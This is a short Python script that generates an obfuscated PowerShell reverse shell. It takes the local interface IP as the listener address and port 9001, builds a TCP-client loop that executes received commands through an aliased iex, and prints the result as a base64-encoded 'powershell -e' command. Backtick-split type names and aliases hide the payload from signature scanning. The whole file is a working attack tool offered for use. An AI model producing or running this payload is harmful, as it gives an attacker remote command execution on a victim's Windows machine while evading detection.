#!/usr/bin/python3

from base64 import b64encode
from netifaces import interfaces, ifaddresses, AF_INET

def b64encode_windows(plaintext):
	utf16_encoded = plaintext.encode('utf16')[2:]
	b64_encoded = b64encode(utf16_encoded).decode()

	return b64_encoded


def listener_ip(interface):
	ip = ifaddresses(interface)[AF_INET][0]['addr']

	return ip


if __name__ == "__main__":
	interface = interfaces()[-1]
	print(f'Using the interface {interface} to determine listener IP')

	ip = listener_ip(interface)
	port = '9001'
	print(f'Using the listener IP and port {ip} and {port} respectively')
	print()

	revshell = 'Set-Alias -Name GEN -Value Out-String;'
	revshell += 'Set-Alias -Name HYO -Value iex;'
	revshell += f'$CS = New-Object Sy`st`em.Net.Sockets.T`CPC`lient(\'{ip}\',{port});'
	revshell += '$IZ = $CS.GetStream();'
	revshell += '[byte[]]$DLT = 0..((2-shl(3*5))-1)|%{0};'
	revshell += 'while(($i = $IZ.Read($DLT, 0, $DLT.Length)) -ne 0){;'
	revshell += '$RSP = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($DLT,0, $i);'
	revshell += '$PTY = (HYO (\'. {\' + $RSP + \'} *>&1\') | GEN );'
	revshell += '$PTY2 = $PTY + (pwd).Path + \'> \';'
	revshell += '$SHU = ([text.encoding]::ASCII).GetBytes($PTY2);'
	revshell += '$IZ.Write($SHU,0,$SHU.Length);'
	revshell += '$IZ.Flush()};'
	revshell += '$CS.Close()'

	print(f'powershell -e {b64encode_windows(revshell)}')
